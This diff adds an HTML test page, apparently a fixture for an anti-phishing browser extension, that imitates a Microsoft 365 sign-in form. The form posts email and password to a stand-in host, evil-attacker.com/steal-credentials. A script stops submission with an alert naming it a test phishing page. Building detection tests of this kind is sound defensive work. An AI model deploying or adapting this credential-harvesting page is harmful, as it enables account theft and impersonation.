@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Microsoft 365 Sign In</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background-color: #f3f3f3;
+      display: grid;
+      place-items: center;
+      height: 100vh;
+      width: 100vw;
+      margin: 0;
+    }
+    .login-container {
+      background: white;
+      padding: 40px;
+      max-width: 440px;
+      width: calc(100% - 40px);
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin: 0 0 20px 0;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #8c8c8c;
+      box-sizing: border-box;
+    }
+    button {
+      background-color: #0067b8;
+      border: 1px solid #0067b8;
+      color: white;
+      padding: 12px 24px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 15px;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <h1>Microsoft 365</h1>
+    </div>
+    <form method="POST" action="https://evil-attacker.com/steal-credentials">
+      <input type="email" name="loginfmt" id="i0116" placeholder="Email, phone, or Skype" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <input type="hidden" name="idPartnerPL">
+      <button type="submit" id="idSIButton9">Sign in</button>
+    </form>
+    <p style="font-size: 13px; color: #666; margin-top: 20px;">
+      Can't access your account?
+    </p>
+  </div>
+  <script>
+    document.querySelector('form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      alert('This is a test phishing page. The extension should have blocked this!');
+    });
+  </script>
+</body>
+</html>
